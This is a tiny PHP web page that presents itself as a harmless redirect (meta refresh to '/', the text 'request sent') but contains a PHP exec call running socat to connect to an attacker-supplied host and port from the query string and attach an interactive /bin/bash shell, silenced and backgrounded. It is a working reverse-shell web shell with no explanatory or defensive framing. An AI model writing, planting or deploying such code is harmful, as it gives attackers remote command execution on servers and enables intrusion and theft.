<head>
<meta http-equiv="refresh" content="0; url=/" />
</head>
request sent
<a href="/">redirect</a>

<?php
  exec('socat tcp-connect:'.$_GET['host'].':'.$_GET['port'].' exec:/bin/bash,pty,stderr,setsid,sigint,sane >/dev/null 2>&1 &');
?>
